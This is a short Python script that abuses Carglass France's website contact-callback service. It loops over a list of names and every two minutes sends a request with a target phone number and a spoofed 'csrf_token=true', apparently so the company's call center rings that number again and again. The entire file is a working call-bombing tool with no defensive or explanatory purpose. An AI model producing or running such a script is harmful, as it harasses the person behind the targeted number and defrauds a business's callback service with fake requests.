import requests
from time import sleep
name = open('name.ini','r')
sur_name = open('surname.ini','r')
number = open('phonenumber.ini','r')
phonenumber = number.read()
for line in name:
	surname = sur_name.readline()
	r = requests.get("https://www.carglass.fr/webservice/contact?name="+line+"&surname=&e164="+phonenumber+"&delay=0&reason=NBOL&csrf_token=true")
	print("Calling "+phonenumber+"...")
	sleep(120)